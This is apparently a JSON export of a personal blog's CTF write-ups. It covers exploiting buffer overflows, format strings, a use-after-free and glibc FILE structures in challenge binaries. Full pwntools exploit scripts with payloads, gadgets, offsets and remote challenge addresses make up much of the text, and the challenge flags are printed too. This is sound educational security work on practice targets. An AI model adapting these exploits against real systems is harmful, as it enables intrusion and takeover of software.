[{"content":"Challenge overview How far can you jump?\nOur binary, can-you-jump, is a 64-bit executable with no protections except NX. The challenge also gives us libc-2.27.so to use.\nAlright, pretty nice, we get a libc leak for printf, and immediately stumble upon a buffer overflow.\nIdentifying the vulnerabilities Let\u0026rsquo;s take a look at the binary next.\nPretty straight-forward, the address of printf is printed, using dlsym (a function that just returns the address of a symbol, this case printf). Then, the function returns a read in buf[56] of 256 bytes, so that\u0026rsquo;s a 200 byte buffer overflow. I\u0026rsquo;m guessing we can find a /bin/sh and system in our libc. Since I can\u0026rsquo;t be bothered to install the .so, we can just test remotely and find the offsets online.\n#2.27 offsts printf_offset = 0x64f70 system_offset = 0x4f550 binsh_offset = 0x1b3e1a Now let\u0026rsquo;s find some gadgets, or more exactly, pop rdi; ret, with ropper - 0x400773, and let\u0026rsquo;s not forget the ret gadget for alignment - 0x400291.\nI\u0026rsquo;m assuming this is a classic ret2libc so we can already build the payload.\n#padding to rbp (64) payload = b\u0026#39;\\x90\u0026#39; * 64 #rbp payload += b\u0026#39;\\x90\u0026#39; * 8 payload += (pop_rdi_ret + p64(binsh) + ret + p64(system)) payload.ljust(256, b\u0026#39;\\x90\u0026#39;) p.send(payload) \u0026hellip;And we get an EOF. Sad but unsurprising for no testing. I modified the payload to jump to main to identify the issue, and it did jump into main and then EOF, so the problem isn\u0026rsquo;t the padding but rather our calculated offsets.\nSo, what\u0026rsquo;s wrong with our addresses? I tested with our local offsets and of course we get a shell, as expected.\nI tried looking around for a solution and I finally found that the issue was the gadgets. We needed gadgets inside libc. So we use ropper on the libc-2.27.so file we\u0026rsquo;re given and get the following:\n0x00000000000c22ec: ret;\n0x00000000000215bf: pop rdi; ret;\nWe replace them in our script accordingly like so:\nlibc_pop_rdi_ret_offset = 0x215bf libc_ret_offset = 0xc22ec pop_rdi_ret = libc + libc_pop_rdi_ret_offset ret = libc + libc_ret_offset And after running the script with the modified payload, we get the flag!\nAs always, the full code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/canyoujump-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eHow far can you \u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/d9e1d410-0719-11ec-a889-9149e5df5aaf?tenant=cyberedu\"\u003ejump?\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eOur binary, \u003cstrong\u003ecan-you-jump\u003c/strong\u003e, is a 64-bit executable with no protections except \u003ccode\u003eNX\u003c/code\u003e. The challenge also gives us \u003ccode\u003elibc-2.27.so\u003c/code\u003e to use.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/canyoujump-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAlright, pretty nice, we get a \u003ccode\u003elibc\u003c/code\u003e leak for \u003ccode\u003eprintf\u003c/code\u003e, and immediately stumble upon a buffer overflow.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerabilities\"\u003eIdentifying the vulnerabilities\u003c/h2\u003e\n\u003cp\u003eLet\u0026rsquo;s take a look at the binary next.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/canyoujump-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003ePretty straight-forward, the address of \u003ccode\u003eprintf\u003c/code\u003e is printed, using \u003ccode\u003edlsym\u003c/code\u003e (a function that just returns the address of a symbol, this case \u003ccode\u003eprintf\u003c/code\u003e). Then, the function returns a \u003ccode\u003eread\u003c/code\u003e in \u003ccode\u003ebuf[56]\u003c/code\u003e of 256 bytes, so that\u0026rsquo;s a 200 byte buffer overflow. I\u0026rsquo;m guessing we can find a \u003ccode\u003e/bin/sh\u003c/code\u003e and \u003ccode\u003esystem\u003c/code\u003e in our \u003ccode\u003elibc\u003c/code\u003e. Since I can\u0026rsquo;t be bothered to install the \u003ccode\u003e.so\u003c/code\u003e, we can just test remotely and find the offsets online.\u003c/p\u003e","title":"CyberEdu can-you-jump Writeup"},{"content":"Introduction This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.\nEnough talking, here is what I solved:\nChristmas PIE - pwn As spoiled by the title, we\u0026rsquo;re dealing with a 64-bit PIE, and we get the address of main upon running the binary.\nTaking a look at the decompiled code, first thing we see is a buffer overflow and a win function. So classic ret2win. We can parse main, calculate the address of win and overwrite the return with win.\nThe final script looks like this:\nfrom pwn import * elf = ELF(\u0026#39;/home/kali/Downloads/christmas_pie\u0026#39;) p=elf.process() p=remote(\u0026#39;34.179.139.43\u0026#39;, 30353) p.recvuntil(b\u0026#39;: \u0026#39;) main = int(p.recvline().strip(), 16) print(hex(main)) #base + 0x12CF = main #base + 0x11FA = win #win = main - 0x12CF + 0x11FA #win = main - 0xD5 win = main-0xD5 #buf payload = b\u0026#39;A\u0026#39; * 80 #rbp payload += b\u0026#39;\\x90\u0026#39;*8 payload += p64(win) p.sendline(payload) p.interactive() The flag: CTF{CHR1STM4S_P13_G1V3S_Y0U_SH3LL}\nSanta\u0026rsquo;s little pwner - pwn Just like the challenge before it, we\u0026rsquo;re working with a 64-bit PIE, except with a little more restrictions this time. Also similarly to Christmas PIE, we have a win function inside of our binary.\nIn this challenge, we get to name two elves, whose names are plainly printed back to us, so immediately, this means format string vulnerability.\nThe restrictions I was talking about are - as you might see in the v4 = __readfsqword(0x28u); - a canary! But since we have a fmtstr vuln we can find out what the canary is and be careful not to overwrite it.\nAnd since we\u0026rsquo;re working with PIE, we also need to leak a function inside our binary to get win. This is to use the buffer overflow in s to redirect to win. Since this function is called twice, the first time it\u0026rsquo;s called, we can leak our addresses and the second time form our payload. I found the canary at %43$p on the stack, and a binary address at an 0x43 offset from win at %21$p.\nThe final script:\nfrom pwn import * elf = ELF(\u0026#39;/home/kali/Downloads/santas_little_pwner\u0026#39;) p=elf.process() p=remote(\u0026#39;34.89.226.167\u0026#39;, 30593) p.recvuntil(b\u0026#39;: \u0026#39;) p.sendline(b\u0026#39;%43$p %21$p\u0026#39;) #get canary + main canary = int(p.recvn(18), 16) p.recvuntil(b\u0026#39; \u0026#39;) main_leak = int(p.recvn(14), 16) win = main_leak + 0x43 print(hex(canary)) print(hex(win)) p.recvuntil(b\u0026#39;: \u0026#39;) payload = b\u0026#39;A\u0026#39;*72 + p64(canary) + b\u0026#39;B\u0026#39;*8 + p64(win) p.sendline(payload) p.interactive() The flag: CTF{wh0_15_4_g00d_b0y_pwn3r}\nDSN - pwn Sadly I didn\u0026rsquo;t get to finish this in time for the ctf, but I though I could make a writeup for this anyways, as it had zero solves. So keep in mind, the script isn\u0026rsquo;t mine, but I will do my best to explain everything that\u0026rsquo;s happening. TLDR, this is FSOP.\nAnyways, this challenge is a bit more complicated than the other ones, and also heap, so twice as bad. So let\u0026rsquo;s take a look at it step by step. First, we\u0026rsquo;re dealing with every restriction possible, including full RelRO, except canary. And the glibc version for this chall is 2.36, keep that in mind.\nWe have an app folder, with a chall and flag.txt inside, and a lib folder with a libc.so.6 and a ld.so.\nIn our main, we have, of course, a menu, and five options to choose from: establish_link, terminate_link, download_telemetry, upload_commands and exit.\nUsing a global array, in this case marked as qword_5080, we can maintain two probes like so: [ probe0_buf | probe0_size | probe1_buf | probe1_size ].\nIn establish_link, we essentially allocate a heap chunk for a probe. We\u0026rsquo;re given a size range (1280 to 4096), and the pointer and size are stored in qword_5080.\nIn terminate_link, we simply free the heap chunk, clear the pointer, but don\u0026rsquo;t check whether the buffer is still in use by the signal handler (more on that later).\nIn download_telemetry, the only important line is puts(qword_5080[id]).\nIn upload_commands, things start to get a little more interesting. We can translate this into something like:\nint upload_commands() { Probe ID read(0, staging, size) active_buf = probe_buf active_len = bytes_read alarm(3) } This active_buf and active_len are qword_5068 and qword_5060. This is because read returns the number of bytes read. And in this case active_buf points directly to the probe\u0026rsquo;s heap buffer.\nThe signal I mentioned previously is triggered at the end of this alarm, and executes:\nmemcpy(active_buf, staging, active_len) Where we control the length. So obviously that alarm is completely out of place; This function is going to be our main issue for this challenge.\nWe also have a handler function, which looks like so:\nvoid handler() { if (active_buf) memcpy(active_buf, staging, active_len); active_buf = NULL; } And this runs asynchronously after alarm(3). So this writes even after the buffer was freed, because it doesn\u0026rsquo;t really check anything properly. So this means we have an async UAF primitive at hand.\nSo we\u0026rsquo;re looking at a couple of vulnerabilities: this async UAF (Use-After-Free) which is more of a Write-After Free:\nupload_commands() to set active_buf\nterminate_link to free it\nhandler to write to freed memory\nThen we also have a heap overflow, which was apparently unintended but it exists anyways, since we can make that active_len pretty big.\nSince, as previously mentioned, we\u0026rsquo;re dealing with glibc 2.36, hooks are removed and RelRO is full so we can\u0026rsquo;t overwrite GOT, we have to do something else.\nThere is something we can do, though, called glibc FILE structure exploitation. Here is a great in-depth resource that talks about it, but I\u0026rsquo;ll try to explain it broadly.\nFirst, what is a glibc FILE? In C, internally, it looks something like:\nstruct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; _IO_FILE is the state, so the buffer pointers, and the vtable is function pointers for I/O operations.\nSo the vtable is a structure of function pointers that define how this stream should behave when I/O happens. And the _IO_FILE contains the data.\nLuckily, glibc keeps a global linked list of all the open FILEs, _IO_list_all. This includes stdin, stdout, and every open fopen() file.\nWhen our program exits or flushes streams, glibc runs _IO_flush_all_lockp().\nThis then does\nfor each file in _IO_list_all: file-\u0026gt;vtable-\u0026gt;overflow(file, EOF) Or _IO_list_all → stdout → stderr → stdin → ....\nSo what we want to do, is insert a fake FILE into _IO_list_all and control its vtable to call a function pointer we can control. Essentially we overwrite a \u0026lsquo;FILE\u0026rsquo; pointer (anything opened by fopen()) to our own forged structure. (This is, obviously, patched in newer libc versions).\nProblem is we can\u0026rsquo;t make a fake vtable, because glibc verifies it and aborts when something\u0026rsquo;s fishy.\nSo in file-\u0026gt;vtable-\u0026gt;overflow(file, EOF); our exploit is going to look like:\nfile is our fake _IO_FILE\nvtable is a legitimate vtable that already exists like _IO_wfile_jumps\noverflow() to a glibc function that reads from file.\nWhat we want to jump to is a one_gadget, so a piece of shellcode that would just take care of everything and get us a shell.\nAlright, now that that\u0026rsquo;s out of the way, let\u0026rsquo;s start actually working on our exploit. First, we want to leak libc, and we\u0026rsquo;re going to have to mess around with allocations for that.\nSo first let\u0026rsquo;s set it up.\na = 0, b = 1 alloc(a, 0x558) alloc(b, 0x500) Because both these sizes are larger than the tcache max, they would both go into the unsorted bin, and they don\u0026rsquo;t get merged because of the different sizes. So now the heap looks like [ chunk A (0x558) ][ chunk B (0x500) ][ top chunk ].\nNow, we need to leak a pointer into main_arena to compute the libc base.\nfree(a) alloc(a, 0x700) This frees our a, and as previously said, it goes into the unsorted bin, and it\u0026rsquo;s fd and bk pointers are set to main_arena + 0x60. After allocating a bigger size, glibc will reuse it, and leftover metadata will still contain some libc pointers.\nBasically the new allocated chunk looks like so:\n+0x00 main_arena+0x60\n+0x08 main_arena+0x60\nmain-arena is inside libc so any pointer to it is a libc pointer. Then we can use upload_telemetry to change one byte into something like an A and then download_telemetry to output the actual libc address.\nWe have libc, now we need to get the heap base. Similarly, we overwrite using upload_telemetry so that our chunk looks like this:\n+0x00 AAAAAAAA\n+0x08 AAAAAAAA\n+0x10 heap pointer\nThen we can get it using download_telemetry.\nThe script up to now looks like this, first the helper functions:\ndef alloc(idx, size): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;Probe ID: \u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;Buffer size: \u0026#39;, str(size).encode()) def free(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;Probe ID: \u0026#39;, str(idx).encode()) def read_buf(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;Probe ID: \u0026#39;, str(idx).encode()) return io.recvline() def write_buf(idx, data): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;Probe ID: \u0026#39;, str(idx).encode()) io.sendafter(b\u0026#39;Data: \u0026#39;, data) def wait_for_write(): io.recvuntil(b\u0026#34;received!\\n\u0026#34;) io.sendline(b\u0026#39;0\u0026#39;) Then the leaks:\na, b = 0, 1 alloc(a, 0x558) alloc(b, 0x500) free(a) alloc(a, 0x700) free(a) alloc(a, 0x558) write_buf(a, b\u0026#34;A\u0026#34;) wait_for_write() # Leak unsorted bin fd → main_arena leak = read_buf(a).strip() libc_leak = u64(leak.ljust(8, b\u0026#34;\\x00\u0026#34;)) libc.address = libc_leak - 0x1d2141 log.success(f\u0026#34;libc base @ {hex(libc.address)}\u0026#34;) #heap # Overwrite first 16 bytes to reach heap pointer write_buf(a, b\u0026#34;A\u0026#34;*16) wait_for_write() leak = read_buf(a).strip() heap_leak = u64(leak[16:].ljust(8, b\u0026#34;\\x00\u0026#34;)) heap_base = heap_leak - 0x290 log.success(f\u0026#34;heap base @ {hex(heap_base)}\u0026#34;) Now the complicated part. We need to build a fake FILE structure. Luckily pwntools has this tool called FileStructure that helps us build a valid _IO_FILE_plus layout. We place it inside of the heap, where we control memory. Then, as I said before, we recycle a preexisting vtable.\nch_addr = heap + 0x290 fs = FileStructure(0) fs.vtable = libc.sym[\u0026#39;_IO_wfile_jumps\u0026#39;] Next, the one_gadget. Using the libc.so.6 file we get:\nWe can add this along with _lock, which is required for safety, importantly just writeable memory that won\u0026rsquo;t crash. Similarly, _wide_data.\nfs.markers = libc.address + 0xd3361 # one_gadget fs._lock = ch_addr + 0x10 fs._wide_data = ch_addr - 0x18 #next some padding fs.unknown2 = ( p64(0) * 4 + p64(ch_addr - 0x8) + p64(0) ) Next we overwrite _IO_list_all by freeing a corrupted FILE chunk.\nchunk[0x18:0x20] = p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x20) fake_chunk-\u0026gt;fd = \u0026amp;_IO_list_all - 0x20 fd-\u0026gt;bk = bk; _IO_list_all = fake_FILE; Upon freeing this chunk with another free(a), glibc is going to call _IO_flush_all_lockp.\nThen we need to free the second probe to force glibc to walk the FILE list:\nfree(b) alloc(b, 0x500) And finally, triggering another I/O operation causes glibc to flush streams:\nwrite(a, b\u0026#39;x\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;: \u0026#39;, str(b).encode()) After everything is said and done, our one_gadget is going to get triggered and grant us a shell.\nSo the end of the script:\nchunk = bytearray(bytes(fs)[0x10:].ljust(0x558, b\u0026#39;\\x00\u0026#39;)) chunk[0x18:0x20] = p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x20) #→ _IO_list_all = fake_FILE chunk[0x528:0x540] = p64(0x31) + p64(heap + 0x7c0) * 2 #prev_size = 0x31 #size = 0x31 #fd = heap+0x7c0 #bk = heap+0x7c0 #this makes the chunk look like a valid smallbin chunk pointing to controlled heap memory #just make it look normal chunk[0x550:0x558] = p64(0x30) #another anticrash thing chunk = bytes(chunk) write(a, chunk) free(a) ##here, _IO_list_all = fake_FILE alloc(a, 0x700) wait_for_write() #heap state stabilization free(b) alloc(b, 0x500) #trigger a free that runs our payload write(a, b\u0026#39;x\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendlineafter(b\u0026#39;: \u0026#39;, str(b).encode()) io.interactive() And here is proof that it actually works:\nAgain, credits to Iacob Razvan Mihai for coming up with this challenge and for the script.\nSanta - misc This was an easy challenge, consisting of a Santa AI chatbot, with the description Did santa give you a present this year, you little helper? (little helper in bold). So I thought they must\u0026rsquo;ve bolded that for a reason, and upon entering the phrase little helper as input for the chatbot, we get the flag.\nThe flag: Vianu_CTF(s4nt4_g4ve_you_a_pr3s3n7_T00?)\nC it\u0026rsquo;s Still a Thing in 2025 - Reverse Engineering If we open the binary with IDA, we immediately get the flag as plaintext.\nThe flag: CTF{b2d7f24e833051d5fc296d4a747281e9d155ecfb636b983cfd70b51ed9b45a32}\nFind It - OSINT The description for this challenge was Find the hidden secret in a photo uploaded by N0th1ngUs3r on a platform that starts with \u0026ldquo;F\u0026rdquo;.. The platform for this was Flickr, some image sharing forum, and after finding the user, we find QR code that they posted, which leads to the flag upon scanning.\nThe flag: CTF{fd3d13ac301958102d1e1038d6a6b0b2e743561b9e31446f42b1d2f32aabeb06}\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eThis is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.\u003c/p\u003e\n\u003cp\u003eEnough talking, here is what I solved:\u003c/p\u003e\n\u003ch2 id=\"christmas-pie---pwn\"\u003eChristmas PIE - pwn\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/vianuctf-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAs spoiled by the title, we\u0026rsquo;re dealing with a 64-bit PIE, and we get the address of \u003ccode\u003emain\u003c/code\u003e upon running the binary.\u003c/p\u003e","title":"VianuCTF 2025"},{"content":"Challenge overview This challenge was a part of the NullCTF 2025, made by tudor, with the description sketchy stuff going on here i\u0026rsquo;m scared.\nUpon checking, we\u0026rsquo;re dealing with NX, PIE and ALSR and no canary.\nLet\u0026rsquo;s take a look at the binary. We have two interesting functions, main and handler.\nInside main, firstly, we are given the address of main (located at PIE address + 0x1265), so we don\u0026rsquo;t need to bother with leaking it. Then, a pointer s gets assigned the string quite interesting stuff you\u0026rsquo;re saying.\nThen, we get to write 58 bytes into buf, which, QWORD buf[6], stores 48 bytes. So we have a 10 byte buffer overflow.\nNext, buf is searched for its first \\n and modifies it into a null byte. Afterwards, it\u0026rsquo;s checked whether the string inside buf is longer than 50 bytes, which calls a sys_exit.\nThen, puts(s) is called, and we get to write a long hexadecimal address in v6 via scanf. If the address is before printf\u0026rsquo;s address, we get to write 5 bytes in the address we chose for v6 with fgets.\nWhat handler does is just start a 100 second timer when connection is established, and when the 100 seconds pass, call puts(\u0026quot;challenge timed out\u0026quot;) and sys_exit.\nThe exploit First of all, let\u0026rsquo;s calculate the base of our PIE.\np.recvuntil(b\u0026#39;: \u0026#39;) main = int(p.recv(14), 16) So since the next move is probably leaking libc, it would be great to somehow make that puts(s) turn into a puts(putsgot). Our best bet is the 10 byte buffer overflow we have at our disposal, our of which the v8 eats 8, so that leaves us with 2 bytes.\nThe string quite interesting stuff you\u0026rsquo;re saying is located in the .rodata, as is the puts got. Since we get to overwrite only two of the LSB in s, that means the distance between the string and got isn\u0026rsquo;t that far.\nBasically, since s is a pointer to a .rodata address, we can modify it to point to another address in .rodata as long as they share everything except the last 2 bytes we can modify.\nThe only problem for now is the buffer overflow verification after that; but since it only checks for the first newline, and it turns it into a null byte aka string terminator, we can trick it into thinking our string ends early by adding a random newline inside our payload.\nHere, we can see by modifying the last byte to 0x20, we end up printing another string in the .rodata. Now let\u0026rsquo;s actually calculate the PIE offset to puts got and get that libc puts_IO!\nputsgot = PIE_base + elf.got[\u0026#39;puts\u0026#39;] #we can modify the last two bytes -\u0026gt; since the dif to got is only two bytes we get got payload = (b\u0026#39;\\x00\u0026#39;*16+b\u0026#39;\\n\u0026#39;+b\u0026#39;\\x00\u0026#39;*39 + #padding to *p p64(putsgot)[:2] ) Great! Now we can parse it and calculate our actual libc base.\nleak = p.recvn(6) puts_leak = u64(leak.ljust(8, b\u0026#39;\\x00\u0026#39;)) print(hex(puts_leak)) #local puts_offset = 0x585a0 system_offset = 0x2b110 #2.40 puts_offset=0x080be0 system_offset=0x51c30 #apparently it was 2.28 puts_offset=0x87be0 I struggled a little with finding the correct version of libc, I assumed it was 2.39 for a long time but apparently it was 2.28.\nThe secret to actually solving this challenge was overwriting the right thing. Because of all the sys_exit(0) calls everywhere, and since after our v6 overwrite no function was actually being called, we can think of two things: first, we can probably use our handler function, which calls puts, and second, overwrite the puts got in a way that we can pop a shell.\nMy first idea was overwriting puts got with system, but the problem was the argument of the function would be challenge timed out, not /bin/sh. Same thing with execve. The solution here was using a one_gadget. We can look for one in our given libc.so.6 like so:\nThe one I went with was 0xef4ce, since it seemed like the most promising. So since it\u0026rsquo;s basically like a gadget except for libc, the actual address of it would be libc base + one_gadget.\nAlright, but after modifying the address with our gadget, the binary immediately calls sys_exit and we don\u0026rsquo;t get that puts caused by the time out, so what can we do?\nWell, since the program will wait until our full fgets input to actually call the sys_exit in main, we can do both at the same time.\nBy this I mean that if we only give some of the 5 bytes in fgets, let\u0026rsquo;s say 3 is enough, and then we wait until the alarm starts, it will end our fgets early, make that overwrite with the 3 bytes we gave it (should be enough, since puts and our gadget share the same first 5 bytes), and call puts (now our shell).\naddr_putsgot = hex(putsgot)[2:].encode() print(addr_putsgot) p.sendline(addr_putsgot) execve = 0xef4ce #execve = 0xef52b one_gadget = libc + execve low3 = p64(one_gadget)[:3] p.send(low3) #now just wait for the alarm After waiting 100 seconds, we pop a shell, and we get the flag!\nAs always, the full code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/sketchy-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eThis challenge was a part of the NullCTF 2025, made by tudor, with the description \u003cem\u003esketchy stuff going on here i\u0026rsquo;m scared\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eUpon checking, we\u0026rsquo;re dealing with \u003ccode\u003eNX\u003c/code\u003e, \u003ccode\u003ePIE\u003c/code\u003e and \u003ccode\u003eALSR\u003c/code\u003e and no canary.\u003c/p\u003e\n\u003cp\u003eLet\u0026rsquo;s take a look at the binary. We have two interesting functions, \u003ccode\u003emain\u003c/code\u003e and \u003ccode\u003ehandler\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/sketchy-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eInside \u003ccode\u003emain\u003c/code\u003e, firstly, we are given the address of \u003ccode\u003emain\u003c/code\u003e (located at PIE address + \u003ccode\u003e0x1265\u003c/code\u003e), so we don\u0026rsquo;t need to bother with leaking it. Then, a pointer \u003ccode\u003es\u003c/code\u003e gets assigned the string \u003cem\u003equite interesting stuff you\u0026rsquo;re saying\u003c/em\u003e.\u003c/p\u003e","title":"Nullctf 2025 Sketchy Writeup"},{"content":"Challenge overview It’s early morning, and the caffeine hasn’t quite kicked in yet. As you sip your cup of coffee, you notice something odd – a mysterious program named cooffee is running on your system.\nAt first glance, the chall looks like a 64-bit executable, and upon a buffer overflow the program immediately leaks us a libc address. We also get the libc-2.31.so to download, and that means this is the libc version our binary uses.\nNow, let\u0026rsquo;s take the look at the disassembled code. In main, we call coffee().\nAside from coffee(), we can see a lot functions with ROP derived names, to the left. And we can see the function getting leaked is printf.\nAnd we can see that both reads are vulnerable to buffer overflow, but printf getting leaked didn\u0026rsquo;t have anything to do with it, it was just hardcoded.\nAll the other functions seem to be empty, so they might\u0026rsquo;ve been added just so the binary has some gadgets for us to use. So we don\u0026rsquo;t even need to execute a ret2plt to leak anything, just take in the input and then calculate the right offsets.\nAfter a checksec, we find out that we have full RelRO, PIE, and NX. And most likely ALSR.\nIdentifying the vulnerabilities Since in coffee(), we have an unsanitized printf, we can also leak values from the stack with a format string vulnerability. Since we\u0026rsquo;re working with a canary, we might be able to leak it this way, and then continue on with our script.\nHere is our canary on the stack; All that\u0026rsquo;s left is to leak it in our program with a lot of %ps.\nAnd here it is! The LSB is shown in the next value, though. Now we just need to calculate the offset to it.\nSo the stack is split between the 155th value on the stack and the 156th. Let\u0026rsquo;s call the 155th value A, and the 156th value B.\nLet\u0026rsquo;s take an example so it\u0026rsquo;s easier to understand.\nA = 0x8b705c2f0bf0b500\nB = 0x8d64ecd3a212573e\ncanary = 3e8b705c2f0bf000\nAnd we consider that the first byte of A is 00, the first byte of B is 3e (little endian). What we need to do, is take A\u0026rsquo;s first byte, then skip the second (in this example, that b5), take all of the rest of its bytes (8b705c2f0bf0), and then add the first byte in B (3e).\nMy script for this was\nA = int(p.recv(18), 16) B = int(p.recv(18), 16) print(hex(A)) print(hex(B)) reconstructed = ( (B \u0026amp; 0xff) \u0026lt;\u0026lt; 56 ) | ( (A \u0026gt;\u0026gt; 16) \u0026lt;\u0026lt; 8 ) | (A \u0026amp; 0xff) #\u0026lt;\u0026lt; 56 -\u0026gt; move it to bits 63-56 print(hex(reconstructed)) Here, we can see we the correct canary value, calculated from A and B! Now let\u0026rsquo;s see what the value of the canary is going to be like after we return and execute a ROP chain.\nThe exploit Before that, let\u0026rsquo;s calculate the offsets from libc to binsh and system. We might have to change them to the appropriate 2.31 versions, to solve the challenge remotely, but we\u0026rsquo;ll worry about that later.\nGreat! Now, let\u0026rsquo;s look for some pop rdi; ret gadgets, using ropper.\n0x0000000000001223: pop rdi; nop; pop rbp; ret; 0x00000000000013b3: pop rdi; ret; Oops, I forgot this chall had PIE enabled\u0026hellip; I guess we will need to leak the binary position as well.\nLuckily, we easily stumble upon 0x55555555511e \u0026lt;_start+46\u0026gt;, as the 43rd value on the stack. Our pop rdi; ret gadget is at binary + 0x13b3, so at 0x55555555511e + 0x295. After double checking, it seems to check out, so we add this to our script:\nA = int(p.recv(18), 16) B = int(p.recv(18), 16) binary_leak = int(p.recv(14), 16) pop_rdi_ret = binary_leak + 0x295 print(hex(A)) print(hex(B)) print(hex(pop_rdi_ret)) Great; We might also need a ret for alignment, so let\u0026rsquo;s take care of that, just in case. The ret offset from the binary is 0x101a, so that\u0026rsquo;s 0x399 bytes off from our pop rdi; ret gadget. So we just add a ret = pop_rdi_ret - 0x399.\nNow, we can start working on our payload, and identifying where we need the canary to be placed.\nIf we look at the function again, it looks like v2 is the canary; Since it checks its content at the end of the function, and reads it from somewhere else. So the first 24 bytes are format\u0026rsquo;s, the next 8 is the canary, and then another 8 bytes for rbp. Since the fread reads 80 bytes, we need to add a bunch of nops at the end of our payload.\nAs predicted, a stack misalignment causes a SIGSEGV, so we just add another ret and\u0026hellip;\npayload = (b\u0026#39;\\x90\u0026#39; * padding_to_canary + p64(canary) + b\u0026#39;\\x90\u0026#39; * 8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)) payload = payload.ljust(80, b\u0026#39;\\x90\u0026#39;) We pop a shell! Now, let\u0026rsquo;s try remotely, and see what happens.\nWell, that\u0026rsquo;s not very good\u0026hellip; Looks like their canary is at a different offset from ours. And probably so is the binary. I printed the first hundred values on the stack, and we find one inside the binary at 0x564ae94060f0. But it\u0026rsquo;s most probably a different one than what we found. And no sight of the canary yet.\nThe values I found for binary values are\n%87$p: 0x5b4de10ff0f0\n%77$p: 0x5d25d3fce040\nAnd clearly since they don\u0026rsquo;t end in the same byte as our locally discovered value, I have no clue what their offset might be. In the meantime, using blukat I found the 2.31 offsets for our ROP chain functions.\nSo all we need to do now is find the canary.\nAfter a bit more searching, we find the 11e ending binary value! At offset 39, so we can update that in our script.\nI also found some canary-looking variables this way: 0x3c9dbcb6f3282a00 0x3e5e2db58d462a00. They were both right next to each other, but I had no way of checking which one was the right one, and I felt like they were too early on. After a bit more time of searching, I found this:\nLooks familiar doesn\u0026rsquo;t it? I\u0026rsquo;m guessing it\u0026rsquo;s the same situation of the canary getting a little scrambled between the two variables, so I won\u0026rsquo;t change the logic just yet. The offsets were %113$p and %114$p.\nAnd would you look at that! It worked!\nAs always, the rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/buycooffe-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eIt’s early morning, and the caffeine hasn’t quite kicked in yet. As you sip your cup of coffee, you notice something odd – a \u003cstrong\u003e\u003ca href=\"https://app.cyber-edu.co/challenges/9d17bf99-ddd2-465c-b5f9-041ad6993053?tenant=cyberedu\"\u003emysterious program\u003c/a\u003e\u003c/strong\u003e named cooffee is running on your system.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/buycooffe-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003echall\u003c/strong\u003e looks like a 64-bit executable, and upon a buffer overflow the program immediately leaks us a \u003ccode\u003elibc\u003c/code\u003e address. We also get the \u003ccode\u003elibc-2.31.so\u003c/code\u003e to download, and that means this is the \u003ccode\u003elibc\u003c/code\u003e version our binary uses.\u003c/p\u003e","title":"CyberEdu Buy-Cooffe Writeup"},{"content":"Challenge overview We got a very strange ftp console? Can you retrive the flag?\nAt first glance, the ftp_server looks like a 32-bit executable, and as hinted by the name, a FTP (File Transfer Protocol) server mockup.\nUpon checking, every protection is disabled, so that\u0026rsquo;s nice! Now let\u0026rsquo;s take a look at the binary.\nWe have a main function that calls login, and we can already see some interesting things going on.\nIdentifying the vulnerabilities First of all, the program leaks the location of system, so that\u0026rsquo;s great! 